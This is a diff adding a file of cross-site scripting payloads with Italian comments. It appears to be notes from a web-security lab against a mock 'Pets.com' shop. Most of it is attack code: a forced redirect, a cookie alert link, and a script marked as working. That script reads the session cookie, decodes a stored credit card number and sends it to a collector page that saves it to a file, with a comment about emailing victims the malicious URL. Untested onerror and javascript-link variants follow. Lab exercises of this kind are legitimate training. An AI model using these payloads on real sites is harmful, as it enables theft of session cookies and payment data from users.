@@ -1,0 +1,42 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% X APRIRE PAGINA ARBITRARIA %%%%%%%%%%%%%%%%%%%%%%
+
+<scrIpt>window.location='https://www.youtube.com/watch?v=dQw4w9WgXcQ'</script>
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% ALERT %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+// versione con carta di credito non decriptata
+<a href='javascript:alert(document.cookie);'> Click me! </a>
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% FUNZIONA %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+// da copiare dopo 'memo=' in URL e premere invio
+// teoricamente vittima riceve link con URL malevolo via mail
+
+<scrIpt>
+	var decodedCookie = decodeURIComponent(document.cookie);
+	var ca = decodedCookie.split(';');
+	var cc = ca[1].split('=');	
+	var ccinfos = ca[0].concat(' ').concat('Pets.com_creditcard=').concat(atob(cc[1])).concat(String.fromCharCode(10));
+	var url = 'http://localhost/getccinfos.php?cookie='.concat(ccinfos);							
+	window.location = url;
+</script>
+
+// localhost/getccinfos.php fa una get del cookie con le info delle cc e le salva nel file storedcc.txt
+// in /var/www/html ho creato un link simbolico alla cartella 5_websecurity e ai file storedinfoss.txt e getccinfos.php
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% NON TESTATI %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+// versione con img 
+<img src='x' onerror=
+	var decodedCookie = decodeURIComponent(document.cookie);
+	var ca = decodedCookie.split(String.fromCharCode(59));
+	var cc = ca[1].split(String.fromCharCode(61));
+	alert(ca[0].concat(String.fromCharCode(10)).concat('Pets.com_creditcard=').concat(atob(cc[1])));
+>
+
+// versione con link
+<a href='javascript: 
+	var decodedCookie = decodeURIComponent(document.cookie);
+	var ca = decodedCookie.split(String.fromCharCode(59));
+	var cc = ca[1].split(String.fromCharCode(61));
+	alert(ca[0].concat(String.fromCharCode(10)).concat('Pets.com_creditcard=').concat(atob(cc[1])));
+</a> 
+
+
